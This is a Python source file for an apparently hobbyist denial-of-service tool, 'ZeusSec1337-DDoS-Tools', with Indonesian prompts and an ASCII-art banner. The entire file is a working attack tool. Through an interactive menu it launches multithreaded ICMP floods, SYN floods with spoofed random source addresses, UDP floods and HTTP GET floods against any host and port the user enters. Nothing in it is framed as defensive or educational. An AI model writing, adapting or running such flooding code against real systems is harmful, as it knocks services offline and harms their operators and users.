import sys
import time
import socket
import random
import threading
from scapy.all import *

class ZeusSec1337:
    def __init__(self,host,port,cont,kalikan_serangan):
        self.host = host
        self.port = port
        self.cont = cont 
        self.kalikan_serangan = kalikan_serangan
    def running_text(self,text):
        for i in text + '\n':
            sys.stdout.write(i)
            sys.stdout.flush()
            time.sleep(0.02)
    def thread(self,perintah):
        command = perintah
        for _ in range(self.kalikan_serangan):
            threading.Thread(target=command).start()
class DDoS(ZeusSec1337):
    def SYN_FLOOD(self):
        count = 0
        while count < self.cont:
            ip_sumber = ".".join(map(str,(random.randint(0,255) for _ in range(4))))
            port_sumber = random.randint(1024,65535)
            paket = IP(src=ip_sumber,dst=self.host)/TCP(sport=port_sumber,dport=self.port,flags="S")
            send(paket,verbose=True)
            count+=1
    def ICMP_FLOOD(self):
        count = 0
        while count < self.cont:
            paket = IP(dst=self.host)/ICMP()
            send(paket,verbose=True)
            count+=1         
    def UDP_FLOOD(self):
        ip_sumber = ".".join(map(str,(random.randint(0,255) for _ in range(4))))
        port_sumber = random.randint(1,65535)
        count = 0
        while count < self.cont:
            paket = IP(src=ip_sumber,dst=self.host)/UDP(sport=port_sumber,dport=self.port)/Raw(load='Serang')
            send(paket,verbose=True)
            count+=1
    def HTTP_GET_FLOOD(self):
        count = 0
        while count < self.cont:
            try:
                socks = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                socks.settimeout(3)
                paket = f'GET / HTTP/1.1\r\nHost:{self.host} \r\n\r\n'.encode()
                socks.connect((self.host,self.port))
                socks.send(paket)
                print(f'Menyerang {self.host}:{self.port}!!!')
                socks.close()
                count+=1
                time.sleep(0.2)
            except (socket.error,ConnectionResetError,ConnectionRefusedError) as E:
                self.running_text(f'(ERROR):{E}')
                break    
    def MENU(self,menu):
        if menu == 1:
            self.thread(self.ICMP_FLOOD)
        elif menu == 2:
            self.thread(self.SYN_FLOOD)
        elif menu == 3:
            self.thread(self.UDP_FLOOD)
        elif menu == 4:
            self.thread(self.HTTP_GET_FLOOD)
        else:
            return 'Tidak ada pilihan'
if __name__=='__main__':
    def text_berjalan(text):
        for i in text + '\n':
            sys.stdout.write(i)
            sys.stdout.flush()
            time.sleep(0.02)  
    ascii_art = '''
  ⠀⠀⢀⣀⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀
⠀⢀⣤⣾⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀
⢠⣾⣿⢛⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⣾⣯⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⢿⡵
⢸⡇⠀⠀⠉⠛⠛⣿⣿⠛⠛⠉⠀⠀⣿⡇  ZeusSec1337-DDoS-Tools v1.0
⢸⣿⣀⠀⢀⣠⣴⡇⠹⣦⣄⡀⠀⣠⣿⡇  developed:ZeusSec1337
⠈⠻⠿⠿⣟⣿⣿⣦⣤⣼⣿⣿⠿⠿⠟⠀  github:sidabutar1337
⠀⠀⠀⠀⠸⡿⣿⣿⢿⡿⢿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠁⠈⠁⠀⠀⠀⠀⠀⠀'''
    text_berjalan(ascii_art)
    text_berjalan('============DDOS-MENU==============')
    text_berjalan('1.ICMP FLOOD (PING FLOOD)')
    text_berjalan('2.SYN FLOOD')
    text_berjalan('3.UDP FLOOD')
    text_berjalan('4.HTTP GET FLOOD')
    try:
        pilih = int(input('root@pilih:~$ '))
        if pilih == 1:
            target_host = input('HOST/IP: ')
            counter = int(input('INGIN BERAPA KALI SERANGAN: '))
            kali = int(input('THREADS: '))
            DDoS(target_host,None,counter,kali).MENU(1)
        elif pilih == 2:
            target_host = input('HOST/IP: ')
            target_port = int(input('PORT: '))
            counter = int(input('INGIN BERAPA KALI SERANGAN: '))
            kali = int(input('THREADS: '))
            DDoS(target_host,target_port,counter,kali).MENU(2)
        elif pilih == 3:
            target_host = input('HOST/IP: ')
            target_port = int(input('PORT: '))
            counter = int(input('INGIN BERAPA KALI SERANGAN: '))
            kali = int(input('THREADS: '))
            DDoS(target_host,target_port,counter,kali).MENU(3)
        elif pilih == 4:
            target_host = input('HOST/IP: ')
            target_port = int(input('PORT: '))
            counter = int(input('INGIN BERAPA KALI SERANGAN: '))
            kali = int(input('THREADS: '))
            DDoS(target_host,target_port,counter,kali).MENU(4)
        else:
            print(DDoS().MENU(pilih))
    except ValueError:
        text_berjalan('Pilihnya pake angka bang!!')


            
                          

  








